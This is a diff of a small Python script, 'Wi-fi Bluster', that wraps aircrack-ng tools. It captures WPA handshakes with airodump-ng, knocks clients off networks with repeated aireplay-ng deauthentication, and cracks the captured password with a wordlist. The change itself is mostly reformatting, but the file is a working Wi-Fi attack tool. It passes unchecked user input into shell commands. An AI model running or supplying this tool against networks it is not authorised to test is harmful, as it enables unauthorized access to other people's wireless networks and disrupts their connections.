@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 
-#module import
+# module import
 import time
 import pyfiglet
 import datetime
@@ -8,19 +8,18 @@ from os import system
 from termcolor import colored
 import os.path
 
-system('clear')	#clears the screen
-print('-'*60)
+system('clear')  # clears the screen
+print('-' * 60)
 scanit = colored(pyfiglet.figlet_format("Wi-fi  Bluster"), 'cyan')
 for i in scanit:
     print(i, end='')
     time.sleep(.001)
 
-print('-'*60)
+print('-' * 60)
 date = datetime.datetime.now()
 print("date", date.date())
 print("time", date.time())
-print('-'*60, "\n")
-
+print('-' * 60, "\n")
 
 print("""Enter Your Choice:
 
@@ -48,8 +47,9 @@ try:
     if a == 3:
         system('rm abc-01.*')
         system('cat dump-01.csv')
-        bssid=input("Enter bssid: ")
-        channel=int(input("Enter channel number: "))
+        print("Now open new tab and run option 4 there after start running option 3")
+        bssid = input("Enter bssid: ")
+        channel = int(input("Enter channel number: "))
         system(f"airodump-ng --bssid {bssid} --channel {channel} --write abc {NetI}")
     if a == 4:
         system('cat abc-01.csv')
@@ -57,15 +57,15 @@ try:
         station = input("Enter Station ID: ")
         system(f"aireplay-ng --deauth 10 -a {bssid} -c {station} {NetI}")
         print("Do u want to de-auth again:")
-        ans=input("Enter here: ")
-        if ans=='yes' or ans=='y' or ans=='Y' or ans=='YES':
+        ans = input("Enter here: ")
+        if ans == 'yes' or ans == 'y' or ans == 'Y' or ans == 'YES':
             system(f"aireplay-ng --deauth 10 -a {bssid} -c {station} {NetI}")
         system('sudo ./main.py')
     if a == 5:
-        word=input("Enter Path of wordlist: ")
+        word = input("Enter Path of wordlist: ")
         system(f"aircrack-ng -w {word} abc-01.cap")
         print("""
-        
+
         Hope you got the password if not try step 4 agian.
         Thank you for using Wifi-Bluster
         """)
